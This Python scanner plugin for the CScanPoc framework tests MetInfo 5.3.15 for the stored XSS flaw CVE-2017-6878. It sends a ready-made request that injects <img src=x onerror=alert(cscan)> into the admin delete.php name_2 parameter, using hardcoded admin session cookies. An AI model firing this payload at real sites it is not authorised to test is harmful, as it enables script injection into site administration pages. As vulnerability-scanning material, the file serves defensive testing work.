# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0021_L'  # 平台漏洞编号，留空
    name = 'MetInfo5.3.15 存储型XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2017-03-14'  # 漏洞公布时间
    desc = '''
        Cross-site scripting (XSS) vulnerability in MetInfo 5.3.15 allows remote authenticated users to inject arbitrary web script or HTML via the name_2 parameter to admin/column/delete.php.
    '''  # 漏洞描述
    ref = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6878'  # 漏洞来源
    cnvd_id = 'CVE-2017-6878'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = '5.3.15'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd999246a-2488-40d0-b48d-33163940086a'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://cve.scap.org.cn/CVE-2017-6878.html
            '''
            Use this POC needs to obtain the cookie after login, because insert JavaScript place in the background.
            The problem find is delete.php?name_2=
            payload is :<img src=x onerror=alert(2)>
            '''
            payload = "/MetInfo5.3/admin/column/delete.php?anyid=25&lang=cn&ajaxmetinfo=1&no_order_2=1&name_2=1<img src=x onerror=alert(cscan)>&nav_2=1&index_num_2=0&action=editor&lang=cn&anyid=25&allid=2,"
            headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            }
            cookies = dict(
                PHPSESSID="9o2pth5a43hpj23nflnc7lfi24",
                recordurl="",
                met_auth="dfc7PoNLWryZ6Bu2hOEqxsEzRwMf3Nc%2BYqOWCxrSuQ2SivQF%2Fwfo0OP4JEP%2F7QakKJaXa46h5BB3nqrtt58caQaJcQ",
                met_key="pnZh0Fw",
                langset="cn",
                upgraderemind="1",
                tablepage_json="0%7Cuser%2Cadmin_user%2Cdojson_user_list"
            )
            url = self.target + payload
            r = requests.get(url, cookies=cookies,
                             headers=headers, timeout=10, verify=False)
            if r.status_code == 200 and "alert(cscan)" in r.text:
                # print ''Success''
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
